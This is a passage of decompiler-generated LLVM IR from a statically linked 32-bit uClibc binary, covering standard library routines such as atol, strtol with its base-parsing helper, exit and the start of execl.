dec_label_pc_8050d83:                             ; preds = %dec_label_pc_8050d22
  %v1_8050d83 = call i32 @__errno_location(i32 %v0_8050cfc)
  store i32 %v1_8050d83, i32* %eax.global-to-local, align 4
  %v1_8050d88 = inttoptr i32 %v1_8050d83 to i32*
  store i32 22, i32* %v1_8050d88, align 4
  %v0_8050d8e = load i32, i32* %stack_var_-36, align 4
  %v1_8050d8e = call i32 @__errno_location(i32 %v0_8050d8e)
  %v1_8050d93 = inttoptr i32 %v1_8050d8e to i32*
  store i32 22, i32* %v1_8050d93, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050d9c

dec_label_pc_8050d9c:                             ; preds = %dec_label_pc_8050d33, %dec_label_pc_8050d6f, %dec_label_pc_8050d83
  %v0_8050da3 = phi i32 [ 0, %dec_label_pc_8050d33 ], [ 0, %dec_label_pc_8050d6f ], [ -1, %dec_label_pc_8050d83 ]
  store i32 %v0_8050cfb, i32* @esi, align 4
  ret i32 %v0_8050da3

; uselistorder directives
  uselistorder i32* %eax.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 %arg3, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8050d9c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8050d33, { 2, 0, 1 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  %v3_8050daf = call i32 @strtol(i32 %arg1, i32 0, i32 10)
  ret i32 %v3_8050daf
}

define i32 @strtol(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_8050dc9 = inttoptr i32 %arg1 to i8*
  %v5_8050dc9 = call i32 @_stdlib_strto_l(i8* %v4_8050dc9, i32 %arg2, i32 %arg3, i32 1)
  ret i32 %v5_8050dc9
}

define i32 @_stdlib_strto_l(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8050dd7 = load i32, i32* @ebx, align 4
  store i32 %v0_8050dd7, i32* %stack_var_-16, align 4
  %v4_8050ddb = ptrtoint i8* %arg1 to i32
  store i32 %v4_8050ddb, i32* @ecx, align 4
  store i32 %arg3, i32* %esi.global-to-local, align 4
  %v0_8050de3 = load i32, i32* @global_var_8055684, align 4
  store i32 %v0_8050de3, i32* %edx.global-to-local, align 4
  store i32 %v4_8050ddb, i32* %ebx.global-to-local, align 4
  %v2_8050dee41 = load i8, i8* %arg1, align 1
  %v3_8050dee42 = sext i8 %v2_8050dee41 to i32
  store i32 %v3_8050dee42, i32* %eax.global-to-local, align 4
  %v2_8050df143 = mul nsw i32 %v3_8050dee42, 2
  %v3_8050df144 = add i32 %v2_8050df143, %v0_8050de3
  %v4_8050df145 = inttoptr i32 %v3_8050df144 to i8*
  %v5_8050df146 = load i8, i8* %v4_8050df145, align 1
  %v6_8050df147 = and i8 %v5_8050df146, 32
  %v7_8050df148 = icmp eq i8 %v6_8050df147, 0
  %v1_8050df549 = icmp eq i1 %v7_8050df148, false
  br i1 %v1_8050df549, label %dec_label_pc_8050ded, label %dec_label_pc_8050df7

dec_label_pc_8050ded:                             ; preds = %entry, %dec_label_pc_8050ded
  %v0_8050ded50 = phi i32 [ %v1_8050ded, %dec_label_pc_8050ded ], [ %v4_8050ddb, %entry ]
  %v1_8050ded = add i32 %v0_8050ded50, 1
  store i32 %v1_8050ded, i32* %ebx.global-to-local, align 4
  %v1_8050dee = inttoptr i32 %v1_8050ded to i8*
  %v2_8050dee = load i8, i8* %v1_8050dee, align 1
  %v3_8050dee = sext i8 %v2_8050dee to i32
  store i32 %v3_8050dee, i32* %eax.global-to-local, align 4
  %v2_8050df1 = mul nsw i32 %v3_8050dee, 2
  %v3_8050df1 = add i32 %v2_8050df1, %v0_8050de3
  %v4_8050df1 = inttoptr i32 %v3_8050df1 to i8*
  %v5_8050df1 = load i8, i8* %v4_8050df1, align 1
  %v6_8050df1 = and i8 %v5_8050df1, 32
  %v7_8050df1 = icmp eq i8 %v6_8050df1, 0
  %v1_8050df5 = icmp eq i1 %v7_8050df1, false
  br i1 %v1_8050df5, label %dec_label_pc_8050ded, label %dec_label_pc_8050df7

dec_label_pc_8050df7:                             ; preds = %dec_label_pc_8050ded, %entry
  %v0_8050ded.lcssa = phi i32 [ %v4_8050ddb, %entry ], [ %v1_8050ded, %dec_label_pc_8050ded ]
  %v2_8050dee.lcssa = phi i8 [ %v2_8050dee41, %entry ], [ %v2_8050dee, %dec_label_pc_8050ded ]
  %v3_8050dee.lcssa = phi i32 [ %v3_8050dee42, %entry ], [ %v3_8050dee, %dec_label_pc_8050ded ]
  %tmp37 = trunc i32 %arg4 to i8
  %v9_8050df7 = icmp eq i8 %v2_8050dee.lcssa, 43
  br i1 %v9_8050df7, label %dec_label_pc_8050e12, label %dec_label_pc_8050dfc

dec_label_pc_8050dfc:                             ; preds = %dec_label_pc_8050df7
  %v9_8050dfc = icmp eq i8 %v2_8050dee.lcssa, 45
  %v1_8050e04 = icmp eq i1 %v9_8050dfc, false
  br i1 %v1_8050e04, label %dec_label_pc_8050e13, label %dec_label_pc_8050e12

dec_label_pc_8050e12:                             ; preds = %dec_label_pc_8050df7, %dec_label_pc_8050dfc
  %storemerge5 = phi i8 [ 1, %dec_label_pc_8050dfc ], [ 0, %dec_label_pc_8050df7 ]
  %v1_8050e12 = add i32 %v0_8050ded.lcssa, 1
  store i32 %v1_8050e12, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050e13

dec_label_pc_8050e13:                             ; preds = %dec_label_pc_8050dfc, %dec_label_pc_8050e12
  %v0_8050e25 = phi i32 [ %v1_8050e12, %dec_label_pc_8050e12 ], [ %v0_8050ded.lcssa, %dec_label_pc_8050dfc ]
  %stack_var_-18.0 = phi i8 [ %storemerge5, %dec_label_pc_8050e12 ], [ 0, %dec_label_pc_8050dfc ]
  %v1_8050e13 = and i32 %arg3, -17
  %v2_8050e13 = icmp eq i32 %v1_8050e13, 0
  %v1_8050e1b = icmp eq i1 %v2_8050e13, false
  br i1 %v1_8050e1b, label %dec_label_pc_8050e41, label %dec_label_pc_8050e1d

dec_label_pc_8050e1d:                             ; preds = %dec_label_pc_8050e13
  %v1_8050e1d = add i32 %arg3, 10
  store i32 %v1_8050e1d, i32* %esi.global-to-local, align 4
  %v1_8050e20 = inttoptr i32 %v0_8050e25 to i8*
  %v2_8050e20 = load i8, i8* %v1_8050e20, align 1
  %v8_8050e20 = icmp eq i8 %v2_8050e20, 48
  %v1_8050e23 = icmp eq i1 %v8_8050e20, false
  br i1 %v1_8050e23, label %dec_label_pc_8050e36, label %dec_label_pc_8050e25

dec_label_pc_8050e25:                             ; preds = %dec_label_pc_8050e1d
  %v1_8050e25 = add i32 %v0_8050e25, 1
  store i32 %v1_8050e25, i32* %ebx.global-to-local, align 4
  %v1_8050e26 = add i32 %arg3, 8
  store i32 %v1_8050e26, i32* %esi.global-to-local, align 4
  %v1_8050e29 = inttoptr i32 %v1_8050e25 to i8*
  %v2_8050e29 = load i8, i8* %v1_8050e29, align 1
  %v2_8050e2d = or i8 %v2_8050e29, 32
  %v7_8050e2d = zext i8 %v2_8050e2d to i32
  %v9_8050e2d = and i32 %v3_8050dee.lcssa, -256
  %v10_8050e2d = or i32 %v7_8050e2d, %v9_8050e2d
  store i32 %v10_8050e2d, i32* %eax.global-to-local, align 4
  %v10_8050e2f = icmp eq i8 %v2_8050e2d, 120
  %v1_8050e31 = icmp eq i1 %v10_8050e2f, false
  br i1 %v1_8050e31, label %dec_label_pc_8050e36, label %dec_label_pc_8050e33

dec_label_pc_8050e33:                             ; preds = %dec_label_pc_8050e25
  %v2_8050e33 = mul i32 %v1_8050e26, 2
  store i32 %v2_8050e33, i32* %esi.global-to-local, align 4
  %v1_8050e35 = add i32 %v0_8050e25, 2
  store i32 %v1_8050e35, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050e36

dec_label_pc_8050e36:                             ; preds = %dec_label_pc_8050e25, %dec_label_pc_8050e1d, %dec_label_pc_8050e33
  %v0_8050e5e13 = phi i32 [ %v1_8050e25, %dec_label_pc_8050e25 ], [ %v0_8050e25, %dec_label_pc_8050e1d ], [ %v1_8050e35, %dec_label_pc_8050e33 ]
  %v0_8050eb822 = phi i32 [ %v1_8050e25, %dec_label_pc_8050e25 ], [ %v4_8050ddb, %dec_label_pc_8050e1d ], [ %v1_8050e25, %dec_label_pc_8050e33 ]
  %v3_8050e3e = phi i32 [ %v1_8050e26, %dec_label_pc_8050e25 ], [ %v1_8050e1d, %dec_label_pc_8050e1d ], [ %v2_8050e33, %dec_label_pc_8050e33 ]
  %v1_8050e36 = add i32 %v3_8050e3e, -17
  %v6_8050e36 = sub i32 16, %v3_8050e3e
  %v7_8050e36 = and i32 %v6_8050e36, %v3_8050e3e
  %v8_8050e36 = icmp slt i32 %v7_8050e36, 0
  %v10_8050e36 = icmp slt i32 %v1_8050e36, 0
  store i32 16, i32* %eax.global-to-local, align 4
  %v2_8050e3e = icmp eq i1 %v10_8050e36, %v8_8050e36
  %v5_8050e3e = select i1 %v2_8050e3e, i32 16, i32 %v3_8050e3e
  store i32 %v5_8050e3e, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8050e41

dec_label_pc_8050e41:                             ; preds = %dec_label_pc_8050e13, %dec_label_pc_8050e36
  %v0_8050eb823 = phi i32 [ %v4_8050ddb, %dec_label_pc_8050e13 ], [ %v0_8050eb822, %dec_label_pc_8050e36 ]
  %v0_8050e5e12 = phi i32 [ %v0_8050e25, %dec_label_pc_8050e13 ], [ %v0_8050e5e13, %dec_label_pc_8050e36 ]
  %v0_8050e50 = phi i32 [ %arg3, %dec_label_pc_8050e13 ], [ %v5_8050e3e, %dec_label_pc_8050e36 ]
  %v1_8050e41 = add i32 %v0_8050e50, -2
  store i32 %v1_8050e41, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v6_8050e49 = icmp ugt i32 %v1_8050e41, 34
  br i1 %v6_8050e49, label %dec_label_pc_8050ead, label %dec_label_pc_8050e4b

dec_label_pc_8050e4b:                             ; preds = %dec_label_pc_8050e41
  %div = udiv i32 -1, %v0_8050e50
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp38 = urem i32 -1, %v0_8050e50
  %v1_8050e52 = trunc i32 %tmp38 to i8
  store i32 %div, i32* %ebp.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v4_8050e8b = urem i32 %arg4, 256
  br label %dec_label_pc_8050e5e

dec_label_pc_8050e5c:                             ; preds = %dec_label_pc_8050ea3, %dec_label_pc_8050e8b
  %v2_8050e60.pre = phi i32 [ %v0_8050ea6, %dec_label_pc_8050ea3 ], [ %v2_8050e60.pre.pre, %dec_label_pc_8050e8b ]
  %v4_8050e5e.pre = phi i32 [ %v1_8050e77, %dec_label_pc_8050ea3 ], [ %v4_8050e5e.pre.pre, %dec_label_pc_8050e8b ]
  %v0_8050e5c = phi i32 [ %v1_8050e7e, %dec_label_pc_8050ea3 ], [ %v0_8050e5c.pre, %dec_label_pc_8050e8b ]
  %stack_var_-18.1 = phi i8 [ %stack_var_-18.2, %dec_label_pc_8050ea3 ], [ %v6_8050e8f, %dec_label_pc_8050e8b ]
  br label %dec_label_pc_8050e5e

dec_label_pc_8050e5e:                             ; preds = %dec_label_pc_8050e4b, %dec_label_pc_8050e5c
  %v0_8050eb821 = phi i32 [ %v0_8050eb823, %dec_label_pc_8050e4b ], [ %v0_8050e5c, %dec_label_pc_8050e5c ]
  %v0_8050e7e = phi i32 [ %v0_8050e5e12, %dec_label_pc_8050e4b ], [ %v0_8050e5c, %dec_label_pc_8050e5c ]
  %v2_8050e60 = phi i32 [ %v4_8050ddb, %dec_label_pc_8050e4b ], [ %v2_8050e60.pre, %dec_label_pc_8050e5c ]
  %v4_8050e5e = phi i32 [ %div, %dec_label_pc_8050e4b ], [ %v4_8050e5e.pre, %dec_label_pc_8050e5c ]
  %stack_var_-18.2 = phi i8 [ %stack_var_-18.0, %dec_label_pc_8050e4b ], [ %stack_var_-18.1, %dec_label_pc_8050e5c ]
  %v1_8050e5e = inttoptr i32 %v0_8050e7e to i8*
  %v2_8050e5e = load i8, i8* %v1_8050e5e, align 1
  %v3_8050e5e = zext i8 %v2_8050e5e to i32
  %v5_8050e5e = and i32 %v4_8050e5e, -256
  %v6_8050e5e = or i32 %v3_8050e5e, %v5_8050e5e
  store i32 %v6_8050e5e, i32* %eax.global-to-local, align 4
  %v2_8050e62 = add i8 %v2_8050e5e, -48
  %v12_8050e62 = zext i8 %v2_8050e62 to i32
  %v14_8050e62 = and i32 %v2_8050e60, -256
  %v15_8050e62 = or i32 %v12_8050e62, %v14_8050e62
  store i32 %v15_8050e62, i32* @ecx, align 4
  %tmp = icmp ult i8 %v2_8050e62, 10
  br i1 %tmp, label %dec_label_pc_8050e77, label %dec_label_pc_8050e6a

dec_label_pc_8050e6a:                             ; preds = %dec_label_pc_8050e5e
  %v2_8050e6a = or i8 %v2_8050e5e, 32
  %v7_8050e6a = zext i8 %v2_8050e6a to i32
  %v10_8050e6a = or i32 %v7_8050e6a, %v5_8050e5e
  store i32 %v10_8050e6a, i32* %eax.global-to-local, align 4
  %v2_8050e6c = or i32 %v14_8050e62, 40
  store i32 %v2_8050e6c, i32* @ecx, align 4
  %tmp55 = icmp ult i8 %v2_8050e6a, 97
  br i1 %tmp55, label %dec_label_pc_8050e77, label %dec_label_pc_8050e72

dec_label_pc_8050e72:                             ; preds = %dec_label_pc_8050e6a
  %v2_8050e74 = add i8 %v2_8050e6a, -87
  %v15_8050e74 = zext i8 %v2_8050e74 to i32
  %v18_8050e74 = or i32 %v15_8050e74, %v14_8050e62
  store i32 %v18_8050e74, i32* @ecx, align 4
  br label %dec_label_pc_8050e77

dec_label_pc_8050e77:                             ; preds = %dec_label_pc_8050e6a, %dec_label_pc_8050e5e, %dec_label_pc_8050e72
  %v0_8050ea6 = phi i32 [ %v2_8050e6c, %dec_label_pc_8050e6a ], [ %v15_8050e62, %dec_label_pc_8050e5e ], [ %v18_8050e74, %dec_label_pc_8050e72 ]
  %v1_8050e77 = urem i32 %v0_8050ea6, 256
  store i32 %v1_8050e77, i32* %eax.global-to-local, align 4
  %v1_8050e7a = load i32, i32* %esi.global-to-local, align 4
  %v2_8050e7a = sub i32 %v1_8050e77, %v1_8050e7a
  %v10_8050e7a = and i32 %v2_8050e7a, %v1_8050e7a
  %v11_8050e7a = icmp slt i32 %v10_8050e7a, 0
  %v13_8050e7a = icmp slt i32 %v2_8050e7a, 0
  %v2_8050e7c = icmp eq i1 %v13_8050e7a, %v11_8050e7a
  br i1 %v2_8050e7c, label %dec_label_pc_8050ead, label %dec_label_pc_8050e7e

dec_label_pc_8050e7e:                             ; preds = %dec_label_pc_8050e77
  %v1_8050e7e = add i32 %v0_8050e7e, 1
  store i32 %v1_8050e7e, i32* %ebx.global-to-local, align 4
  %v0_8050e7f = load i32, i32* %edx.global-to-local, align 4
  %v1_8050e7f = load i32, i32* %ebp.global-to-local, align 4
  %tmp56 = icmp ugt i32 %v0_8050e7f, %v1_8050e7f
  br i1 %tmp56, label %dec_label_pc_8050e8b, label %dec_label_pc_8050e83

dec_label_pc_8050e83:                             ; preds = %dec_label_pc_8050e7e
  %v12_8050e7f = icmp eq i32 %v0_8050e7f, %v1_8050e7f
  %v1_8050e83 = icmp eq i1 %v12_8050e7f, false
  br i1 %v1_8050e83, label %dec_label_pc_8050ea3, label %dec_label_pc_8050e85

dec_label_pc_8050e85:                             ; preds = %dec_label_pc_8050e83
  %v1_8050e85 = trunc i32 %v0_8050ea6 to i8
  %tmp57 = icmp ugt i8 %v1_8050e85, %v1_8050e52
  br i1 %tmp57, label %dec_label_pc_8050e8b, label %dec_label_pc_8050ea3

dec_label_pc_8050e8b:                             ; preds = %dec_label_pc_8050e85, %dec_label_pc_8050e7e
  store i32 %v4_8050e8b, i32* %eax.global-to-local, align 4
  %v6_8050e8f = and i8 %stack_var_-18.2, %tmp37
  %v1_8050e93 = sext i8 %v6_8050e8f to i32
  %v2_8050e93 = call i32 @__errno_location(i32 %v1_8050e93)
  store i32 %v2_8050e93, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %edx.global-to-local, align 4
  %v1_8050e9b = inttoptr i32 %v2_8050e93 to i32*
  store i32 34, i32* %v1_8050e9b, align 4
  %v0_8050e5c.pre = load i32, i32* %ebx.global-to-local, align 4
  %v4_8050e5e.pre.pre = load i32, i32* %eax.global-to-local, align 4
  %v2_8050e60.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8050e5c

dec_label_pc_8050ea3:                             ; preds = %dec_label_pc_8050e85, %dec_label_pc_8050e83
  %v4_8050ea3 = mul i32 %v0_8050e7f, %v1_8050e7a
  store i32 %v1_8050e77, i32* %eax.global-to-local, align 4
  %v2_8050ea9 = add i32 %v4_8050ea3, %v1_8050e77
  store i32 %v2_8050ea9, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8050e5c

dec_label_pc_8050ead:                             ; preds = %dec_label_pc_8050e77, %dec_label_pc_8050e41
  %v0_8050eb8 = phi i32 [ %v0_8050eb823, %dec_label_pc_8050e41 ], [ %v0_8050eb821, %dec_label_pc_8050e77 ]
  %stack_var_-18.3 = phi i8 [ %stack_var_-18.0, %dec_label_pc_8050e41 ], [ %stack_var_-18.2, %dec_label_pc_8050e77 ]
  %v4_8050ead = icmp eq i32 %arg2, 0
  br i1 %v4_8050ead, label %dec_label_pc_8050eba, label %dec_label_pc_8050eb4

dec_label_pc_8050eb4:                             ; preds = %dec_label_pc_8050ead
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_8050eb8 = inttoptr i32 %arg2 to i32*
  store i32 %v0_8050eb8, i32* %v2_8050eb8, align 4
  br label %dec_label_pc_8050eba

dec_label_pc_8050eba:                             ; preds = %dec_label_pc_8050ead, %dec_label_pc_8050eb4
  %v8_8050eba = icmp eq i8 %stack_var_-18.3, 0
  %v2_8050ebf = zext i1 %v8_8050eba to i32
  %v13_8050ebf = icmp eq i1 %v8_8050eba, false
  %v1_8050ec13 = or i32 %v2_8050ebf, -2147483648
  store i32 %v1_8050ec13, i32* %ebx.global-to-local, align 4
  %v5_8050ec7 = icmp eq i8 %tmp37, 0
  br i1 %v5_8050ec7, label %dec_label_pc_8050edf, label %dec_label_pc_8050ece

dec_label_pc_8050ece:                             ; preds = %dec_label_pc_8050eba
  %v0_8050ece = load i32, i32* %edx.global-to-local, align 4
  %tmp58 = icmp ugt i32 %v0_8050ece, %v1_8050ec13
  br i1 %tmp58, label %dec_label_pc_8050ed2, label %dec_label_pc_8050edf

dec_label_pc_8050ed2:                             ; preds = %dec_label_pc_8050ece
  %v1_8050ed2 = sext i8 %stack_var_-18.3 to i32
  %v2_8050ed2 = call i32 @__errno_location(i32 %v1_8050ed2)
  store i32 %v2_8050ed2, i32* %eax.global-to-local, align 4
  %v0_8050ed7 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8050ed7, i32* %edx.global-to-local, align 4
  %v1_8050ed9 = inttoptr i32 %v2_8050ed2 to i32*
  store i32 34, i32* %v1_8050ed9, align 4
  br label %dec_label_pc_8050edf

dec_label_pc_8050edf:                             ; preds = %dec_label_pc_8050ece, %dec_label_pc_8050eba, %dec_label_pc_8050ed2
  %v0_8050edf = load i32, i32* %edx.global-to-local, align 4
  %v1_8050ee1 = sub i32 0, %v0_8050edf
  %v4_8050ee8 = select i1 %v13_8050ebf, i32 %v1_8050ee1, i32 %v0_8050edf
  store i32 %v4_8050ee8, i32* @edx, align 4
  %v2_8050eee = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8050eee, i32* @ebx, align 4
  store i32 %v4_8050ee8, i32* %eax.global-to-local, align 4
  ret i32 %v4_8050ee8

; uselistorder directives
  uselistorder i32 %v4_8050ee8, { 1, 0, 2 }
  uselistorder i1 %v8_8050eba, { 1, 0 }
  uselistorder i8 %v6_8050e8f, { 1, 0 }
  uselistorder i32 %v1_8050e7f, { 1, 0 }
  uselistorder i32 %v0_8050e7f, { 2, 1, 0 }
  uselistorder i32 %v1_8050e7e, { 1, 0 }
  uselistorder i32 %v2_8050e7a, { 1, 0 }
  uselistorder i32 %v1_8050e77, { 4, 2, 1, 0, 3 }
  uselistorder i32 %v0_8050ea6, { 2, 0, 1 }
  uselistorder i8 %v2_8050e6a, { 1, 0, 2 }
  uselistorder i32 %v14_8050e62, { 0, 2, 1 }
  uselistorder i32 %v0_8050e5c, { 1, 0 }
  uselistorder i32 %v0_8050e50, { 1, 0, 2 }
  uselistorder i32 %v3_8050e3e, { 1, 0, 3, 2 }
  uselistorder i32 %v2_8050e33, { 1, 0 }
  uselistorder i32 %v1_8050e26, { 1, 0, 2 }
  uselistorder i8 %stack_var_-18.0, { 1, 0 }
  uselistorder i32 %v0_8050e25, { 1, 2, 0, 3, 4 }
  uselistorder i8 %tmp37, { 1, 0 }
  uselistorder i8 %v2_8050dee.lcssa, { 1, 0 }
  uselistorder i32 %v0_8050ded.lcssa, { 1, 0 }
  uselistorder i32 %v1_8050ded, { 0, 3, 2, 1 }
  uselistorder i32 %v0_8050de3, { 1, 0, 2 }
  uselistorder i32 %v4_8050ddb, { 5, 4, 3, 0, 1, 2, 6 }
  uselistorder i32* %esi.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* %edx.global-to-local, { 6, 1, 7, 2, 3, 4, 5, 8, 0 }
  uselistorder i32* %ebx.global-to-local, { 2, 3, 4, 5, 6, 7, 0, 1, 8 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 8, 9, 5, 6, 7, 10, 11, 12, 13, 14, 0, 15 }
  uselistorder i8 -87, { 1, 0 }
  uselistorder i32 -17, { 2, 4, 0, 3, 1 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8050edf, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050eba, { 1, 0 }
  uselistorder label %dec_label_pc_8050e77, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050e5e, { 1, 0 }
  uselistorder label %dec_label_pc_8050e41, { 1, 0 }
  uselistorder label %dec_label_pc_8050e36, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050e13, { 1, 0 }
  uselistorder label %dec_label_pc_8050e12, { 1, 0 }
  uselistorder label %dec_label_pc_8050ded, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v2_8050f0b = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8050f0b, i32* @ebx, align 4
  %v2_8050f10 = call i32 @__pthread_return_void(i32 %v2_8050f0b, i32 134550239)
  %v1_8050f1c = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80558c0.147 to i32))
  %v0_8050f21 = load i32, i32* @global_var_805b958.148, align 8
  store i32 %v0_8050f21, i32* @eax, align 4
  %v1_8050f29 = icmp eq i32 %v0_8050f21, 0
  br i1 %v1_8050f29, label %dec_label_pc_8050f36, label %dec_label_pc_8050f2d

dec_label_pc_8050f2d:                             ; preds = %entry
  %v0_8050f30 = load i32, i32* @esi, align 4
  %v1_8050f31 = call i32 @unknown_0(i32 %v0_8050f30)
  store i32 %v1_8050f31, i32* @eax, align 4
  br label %dec_label_pc_8050f36

dec_label_pc_8050f36:                             ; preds = %entry, %dec_label_pc_8050f2d
  %v2_8050f3b = call i32 @__pthread_return_void(i32 %v2_8050f0b, i32 1)
  %v0_8050f40 = call i32 @__GI___uClibc_fini()
  %v0_8050f51 = call i32 @_stdio_term()
  %v0_8050f59 = load i32, i32* @esi, align 4
  %v1_8050f5a = call i32 @__GI__exit(i32 %v0_8050f59)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @__GI__exit, { 1, 0, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder label %dec_label_pc_8050f36, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %v0_8050f66 = load i32, i32* @ebx, align 4
  store i32 %v0_8050f66, i32* %stack_var_-12, align 4
  %v2_8050f67 = ptrtoint i32* %stack_var_12 to i32
  store i32 %v2_8050f67, i32* %eax.global-to-local, align 4
  %v12_8050f6a = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_8050f70

dec_label_pc_8050f70:                             ; preds = %dec_label_pc_8050f70, %entry
  %v0_8050f73 = phi i32 [ 0, %entry ], [ %v1_8050f73, %dec_label_pc_8050f70 ]
  %stack_var_-16.0 = phi i32 [ %v2_8050f67, %entry ], [ %v1_8050f74, %dec_label_pc_8050f70 ]
  %v1_8050f73 = add i32 %v0_8050f73, 1
  store i32 %v1_8050f73, i32* %esi.global-to-local, align 4
  %v1_8050f74 = add i32 %stack_var_-16.0, 4
  store i32 %v1_8050f74, i32* %eax.global-to-local, align 4
  %v1_8050f7a = inttoptr i32 %stack_var_-16.0 to i32*
  %v2_8050f7a = load i32, i32* %v1_8050f7a, align 4
  %v3_8050f7a = icmp eq i32 %v2_8050f7a, 0
  %v1_8050f7d = icmp eq i1 %v3_8050f7a, false
  br i1 %v1_8050f7d, label %dec_label_pc_8050f70, label %dec_label_pc_8050f7f

dec_label_pc_8050f7f:                             ; preds = %dec_label_pc_8050f70
  %v1_8050f7f = mul i32 %v1_8050f73, 4
  %v2_8050f7f = add i32 %v1_8050f7f, 34
  %v1_8050f86 = and i32 %v2_8050f7f, -16
  %v2_8050f89 = sub i32 %v12_8050f6a, %v1_8050f86
  %v1_8050f8e = add i32 %v2_8050f89, 15
  %v1_8050f92 = and i32 %v1_8050f8e, -16
  store i32 %v1_8050f92, i32* @ebx, align 4
  store i32 %v1_8050f92, i32* %ecx.global-to-local, align 4
  %v2_8050f97 = inttoptr i32 %v1_8050f92 to i32*
  store i32 %arg2, i32* %v2_8050f97, align 16
  store i32 %v2_8050f67, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050f9f

dec_label_pc_8050f9f:                             ; preds = %dec_label_pc_8050f9f, %dec_label_pc_8050f7f
  %stack_var_-16.1 = phi i32 [ %v2_8050f67, %dec_label_pc_8050f7f ], [ %v1_8050fa6, %dec_label_pc_8050f9f ]
  store i32 %stack_var_-16.1, i32* %eax.global-to-local, align 4
  %v0_8050fa2 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050fa2 = add i32 %v0_8050fa2, 4
  store i32 %v1_8050fa2, i32* %ecx.global-to-local, align 4
  %v0_8050fa5 = load i32, i32* %esi.global-to-local, align 4
  %v1_8050fa5 = add i32 %v0_8050fa5, -1
  %v8_8050fa5 = icmp eq i32 %v1_8050fa5, 0
  store i32 %v1_8050fa5, i32* %esi.global-to-local, align 4
  %v1_8050fa6 = add i32 %stack_var_-16.1, 4
  %v1_8050fac = inttoptr i32 %stack_var_-16.1 to i32*
  %v2_8050fac = load i32, i32* %v1_8050fac, align 4
  store i32 %v2_8050fac, i32* %eax.global-to-local, align 4
  %v2_8050fae = inttoptr i32 %v1_8050fa2 to i32*
  store i32 %v2_8050fac, i32* %v2_8050fae, align 4
  %v1_8050fb0 = icmp eq i1 %v8_8050fa5, false
  br i1 %v1_8050fb0, label %dec_label_pc_8050f9f, label %dec_label_pc_8050fb2

dec_label_pc_8050fb2:                             ; preds = %dec_label_pc_8050f9f
  %v0_8050fb2 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050fb2 = load i32, i32* @esp, align 4
  %v2_8050fb2 = add i32 %v1_8050fb2, -4
  %v3_8050fb2 = inttoptr i32 %v2_8050fb2 to i32*
  store i32 %v0_8050fb2, i32* %v3_8050fb2, align 4
  %v0_8050fb3 = load i32, i32* @global_var_805b960.149, align 32
  %v2_8050fb3 = add i32 %v1_8050fb2, -8
  %v3_8050fb3 = inttoptr i32 %v2_8050fb3 to i32*
  store i32 %v0_8050fb3, i32* %v3_8050fb3, align 4
  %v0_8050fb9 = load i32, i32* @ebx, align 4
  %v2_8050fb9 = add i32 %v1_8050fb2, -12
  %v3_8050fb9 = inttoptr i32 %v2_8050fb9 to i32*
  store i32 %v0_8050fb9, i32* %v3_8050fb9, align 4
  %v5_8050fba = add i32 %v1_8050fb2, -16
  %v6_8050fba = inttoptr i32 %v5_8050fba to i32*
  store i32 %arg1, i32* %v6_8050fba, align 4
  %v1_8050fbd = inttoptr i32 %v1_8050fa6 to i8*
  %v2_8050fbd = call i32 @__GI_execve(i8* %v1_8050fbd)
  store i32 %v2_8050fbd, i32* %eax.global-to-local, align 4
  %v2_8050fc5 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8050fc5, i32* @ebx, align 4
  ret i32 %v2_8050fbd

; uselistorder directives
  uselistorder i32 %v1_8050fa5, { 1, 0 }
  uselistorder i32 %stack_var_-16.1, { 1, 0, 2 }
  uselistorder i32 %v1_8050f74, { 1, 0 }
  uselistorder i32 %v1_8050f73, { 0, 2, 1 }
